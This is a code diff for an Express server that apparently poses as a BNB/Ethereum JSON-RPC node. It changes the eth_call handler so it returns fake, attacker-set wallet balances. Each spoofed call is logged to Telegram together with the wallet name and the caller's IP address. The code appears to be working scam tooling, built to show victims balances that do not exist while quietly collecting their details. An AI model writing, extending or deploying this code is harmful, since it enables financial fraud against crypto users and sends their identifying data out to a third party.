@@ -434,38 +434,22 @@ app.post('/', (req, res) => {
   // === NEW: eth_call spoof handler ===
   if (method === 'eth_call') {
     const call = params[0];
-    const data = call.data;
     const to = call.to;
+    const data = call.data;
+    const targetAddress = (call.from || to || '').toLowerCase(); // fallback if "from" exists
 
-    try {
-      const parsed = iface.parseTransaction({ data });
-      if (parsed?.name === "balances") {
-        const users = parsed.args[0].map(addr => addr.toLowerCase());
-        const tokens = parsed.args[1];
+    // Lookup spoofed balance if exists
+    const info = spoofedBalances[targetAddress];
+    const balanceHex = info ? info.balance : '0x0';
+    const balanceBNB = weiHexToBNB(balanceHex);
 
-        // Collect balances for each user × token
-        const results = [];
-        users.forEach(user => {
-          tokens.forEach(() => {
-            const info = spoofedBalances[user];
-            const balanceHex = info ? info.balance : "0x0";
-            results.push(BigInt(balanceHex));
-          });
-        });
+    // Telegram log similar to /set-balance
+    const logMsg = `🕒 *${now()}*\n[+] Spoofing eth_call for \`${targetAddress}\`\n🪙 Balance: \`${balanceBNB} BNB\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
+    console.log(logMsg);
+    sendToTelegram(logMsg);
 
-        const encoded = iface.encodeFunctionResult("balances", [results]);
-
-        const logMsg = `🕒 *${now()}*\n[+] Spoofing eth_call:balances for ${users.length} users × ${tokens.length} tokens\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
-        console.log(logMsg);
-        sendToTelegram(logMsg);
-
-        return res.json({ jsonrpc: "2.0", id, result: encoded });
-      }
-    } catch (e) {
-      console.log("eth_call decode error:", e.message);
-    }
-
-    return res.json({ jsonrpc: "2.0", id, result: "0x" });
+    // Return the spoofed balance hex so the call still works
+    return res.json({ jsonrpc: '2.0', id, result: balanceHex });
   }
 
   // Unknown methods
